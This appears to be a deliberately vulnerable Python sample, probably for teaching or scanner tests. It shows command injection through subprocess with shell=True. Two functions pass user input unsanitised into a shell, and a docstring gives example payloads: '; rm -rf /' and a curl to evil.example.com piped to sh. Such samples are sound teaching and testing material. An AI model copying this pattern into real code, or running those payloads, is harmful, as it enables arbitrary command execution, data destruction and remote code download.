"""Command-injection vulnerability via subprocess shell=True with user input."""

import subprocess


def run_user_command(user_input: str) -> str:
    """Run a user-supplied shell command and return its output.

    VULNERABILITY: shell=True interpolates user_input directly into the
    shell, allowing arbitrary command execution (e.g., '; rm -rf /' or
    '$(curl evil.example.com/sh | sh)').
    """
    return subprocess.check_output(user_input, shell=True).decode()


def list_directory(directory: str) -> str:
    """List a directory by name. VULNERABILITY: same shell injection."""
    return subprocess.check_output(f"ls {directory}", shell=True).decode()
